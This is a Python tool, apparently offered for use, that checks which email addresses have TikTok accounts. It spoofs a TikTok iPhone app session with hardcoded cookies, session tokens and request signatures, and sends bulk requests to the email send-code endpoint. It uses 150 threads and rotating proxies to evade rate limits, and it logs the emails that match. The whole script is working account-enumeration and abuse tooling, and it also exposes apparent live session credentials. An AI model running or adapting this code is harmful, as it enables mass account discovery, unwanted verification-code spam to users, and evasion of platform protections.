try:
	from requests import post
	from threading import Thread,Lock
	from random import choice
	import requests,sys
	from time import sleep
except Exception as Joker:exit(input(Joker))
class RSN:
	def Nfund(): return "Account doesn't exist"
	def sentd():return '"message":"success"'
	def BAND(): return 'Maximum number of attempts reached. Try again later.'
	def ErrEml(): return 'Enter a valid email address'
class TIKTOK_EMAILS:
	def __init__(self):
		self.PROXS,self.ERROR,self.DONE=0,0,0
		self.Loks=Lock();self.RUN=True
		self.emails='joker@221298.vv1ck'
		try:self.All=open(input('\n[+] Enter the email file name: '),'r')
		except FileNotFoundError:print('\n[!!] Invalid filename, please try again ..\n');return TIKTOK_EMAILS()
		try:self.proxy =  open(input('\n[$] ->> Enter name file (Proxy) : '),'r').read().splitlines()
		except FileNotFoundError:print('\n[!!] Invalid filename, please try again ..\n');return TIKTOK_EMAILS()
		print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		Thread(target=self.PRNT).start()
		self.TRET()
	def PRNT(self):
		while self.RUN:
			try:print(f'\r - Checked-TIK:[{self.DONE}], Error:[{self.ERROR}], proxies:[{self.PROXS}] |{self.emails}\r',end="")
			except KeyboardInterrupt:sys.exit()
	def Stops(self):
		with self.Loks:
			sys.exit(input('\n[!] Examination finished ..'))
	def RESAT_TIKTOk(self):
		while self.RUN:
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(choice(proxylist))
			try:
				user = self.All.readline().split('\n')[0]
				self.emails= user.split(':')[0]
				if user=='':
					self.RUN=False
					self.Stops()
					sys.exit()
				sent=post('https://api16-normal-c-alisg.tiktokv.com/passport/email/send_code/?residence=JO&device_id=7002851779940271622&os_version=14.6&app_id=1233&iid=7090067468483643138&app_name=musical_ly&vendor_id=A0E47A34-1BAE-4407-AB86-219468E804C5&locale=en&ac=WIFI&sys_region=JO&ssmix=a&version_code=17.6.1&vid=A0E47A34-1BAE-4407-AB86-219468E804C5&channel=App%20Store&op_region=JO&os_api=18&idfa=00000000-0000-0000-0000-000000000000&install_id=7090067468483643138&idfv=A0E47A34-1BAE-4407-AB86-219468E804C5&device_platform=iphone&device_type=iPhone11%2C2&openudid=62b064ef098f5d1c5817b2bf68f0ce3be9a52dcf&account_region=&tz_name=Asia%2FAmman&tz_offset=10800&app_language=en&carrier_region=JO&current_region=JO&aid=1233&mcc_mnc=41601&screen_width=1125&uoo=1&content_language=&language=en&cdid=C3303766-D942-4770-B538-DADCC78137C4&build_number=176111&app_version=17.6.1&resolution=1125%2A2436',headers={'Host': 'api16-normal-c-alisg.tiktokv.com','Connection': 'keep-alive','Content-Length': '104','Cookie': 'passport_csrf_token=c64134544b5b723baafbe55de8d4db49; passport_csrf_token_default=c64134544b5b723baafbe55de8d4db49; d_ticket=5ba0ccc1fa15ea9be3319bd3edefc75c30238; tt-target-idc=alisg; install_id=7090067468483643138; ttreq=1$aab6c0c0095492356bf3d2ba7f0a997cab238a5d; msToken=Zxwns32Pmsc25uw3RIu8exVBPjEB94fZbc5zFm2sr8vDCG8XCMSgCeDWEPKADbS8le7Chjix6MxQTGbaXfP6YgG81pFqVDsesLh9ujSC5g==; multi_sids=; sid_guard=c0803c0a0d0bcd1abe4f2c57e2a1d285%7C1650785699%7C21599%7CSun%2C+24-Apr-2022+13%3A34%3A58+GMT; uid_tt=bc40e1d52af89e35bed2581739e5298d; uid_tt_ss=bc40e1d52af89e35bed2581739e5298d; sid_tt=c0803c0a0d0bcd1abe4f2c57e2a1d285; sessionid=c0803c0a0d0bcd1abe4f2c57e2a1d285; sessionid_ss=c0803c0a0d0bcd1abe4f2c57e2a1d285; odin_tt=2c315d98f5bb212a417e4cc79301728ab54d7c6dc730d065a89bb7217e2a5b4397e4591fa1f02deec50d112770d3439ad9a7f069c3e0ffc075c647058a4e367fa20ad42fa999246dee089aa195f4f80f; store-idc=alisg; store-country-code=jo','x-Tt-Token': '01c0803c0a0d0bcd1abe4f2c57e2a1d28502cdd935c8f7f3b110a5f3e7d87860b602632f2cb481d1da41de2e1c2d1244e327fe9d28a7a1951ea9c6305a1989fd6e6f5afdab9155391af052a73c7b82e2daa38a5fb30ec170983a1c105ca395b665f87-1.0.1','Content-Type': 'application/x-www-form-urlencoded','X-SS-Cookie': 'store-country-code=jo; store-idc=alisg; odin_tt=2c315d98f5bb212a417e4cc79301728ab54d7c6dc730d065a89bb7217e2a5b4397e4591fa1f02deec50d112770d3439ad9a7f069c3e0ffc075c647058a4e367fa20ad42fa999246dee089aa195f4f80f; multi_sids=; sessionid=c0803c0a0d0bcd1abe4f2c57e2a1d285; sessionid_ss=c0803c0a0d0bcd1abe4f2c57e2a1d285; sid_guard=c0803c0a0d0bcd1abe4f2c57e2a1d285%7C1650785699%7C21599%7CSun%2C+24-Apr-2022+13%3A34%3A58+GMT; sid_tt=c0803c0a0d0bcd1abe4f2c57e2a1d285; uid_tt=bc40e1d52af89e35bed2581739e5298d; uid_tt_ss=bc40e1d52af89e35bed2581739e5298d; msToken=Zxwns32Pmsc25uw3RIu8exVBPjEB94fZbc5zFm2sr8vDCG8XCMSgCeDWEPKADbS8le7Chjix6MxQTGbaXfP6YgG81pFqVDsesLh9ujSC5g==; install_id=7090067468483643138; tt-target-idc=alisg; ttreq=1$aab6c0c0095492356bf3d2ba7f0a997cab238a5d; d_ticket=5ba0ccc1fa15ea9be3319bd3edefc75c30238; passport_csrf_token=c64134544b5b723baafbe55de8d4db49; passport_csrf_token_default=c64134544b5b723baafbe55de8d4db49','tt-request-time': '1650785929321','User-Agent': 'TikTok 17.6.1 rv:176111 (iPhone; iOS 14.6; en_JO@numbers=latn) Cronet','x-tt-passport-csrf-token':'c64134544b5b723baafbe55de8d4db49','sdk-version': '2','passport-sdk-version': '5.12.1','X-SS-STUB': 'FA12EE41FCB7D6D115A10598681B7DCD','x-tt-store-idc': 'alisg','x-tt-store-region': 'jo','X-SS-DP': '1233','x-tt-trace-id': '00-5a8249eb10612f2097560d4606ab04d1-5a8249eb10612f20-01','X-Khronos': '1650788','X-Gorgon':'036141108000bdd927f0b51fbe74c6b04a86b996c499ca25cd6f'},data='account_sdk_source=app&email='+"".join([hex(int(x ^ 5))[2:] for x in self.emails.encode('utf-8')])+'&mix_mode=1&type=31',proxies={"http": f"http://{run}","https": f"http://{run}"})
				
				if (RSN.sentd() in sent.text ):
					self.DONE+=1
					with open('NEW-EMAIL-TIKTOK.txt', 'a') as J:J.write(self.emails+'\n')
				elif (RSN.Nfund() in sent.text ):
					self.ERROR+=1
				elif (RSN.BAND() in sent.text ):
					self.PROXS+=1
				elif RSN.ErrEml() in sent.text:
					self.ERROR+=1
				elif sent.status_code==503:
					self.PROXS+=1
				else:print(sent.text)
			except requests.exceptions.ConnectionError:
				self.PROXS+=1
			except requests.exceptions.ReadTimeout:
				self.PROXS+=1
			except KeyboardInterrupt:sys.exit()
			except AttributeError:
				self.ERROR+=1
	def TRET(self):
		theards =[]
		for i in range(150):
			trts = Thread(target=self.RESAT_TIKTOk)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
		sys.exit(input('\n[!] Examination finished ..'))
if __name__ == '__main__':
	print("""
┈╱╱▏┈┈╱╱╱╱▏╱╱▏┈┈┈   By Joker@221298
┈▇╱▏┈┈▇▇▇╱▏▇╱▏┈┈┈ Checker Email For TikTok
┈▇╱▁┈ ▇╱▇╱▏▇╱▏▁┈┈   -------------------
┈▇╱╱╱▏▇╱▇╱▏▇╱╱╱▏┈       I see you
┈▇▇▇╱┈▇▇▇╱┈▇▇▇╱┈┈     I'm everywhere
""")
	TIKTOK_EMAILS()
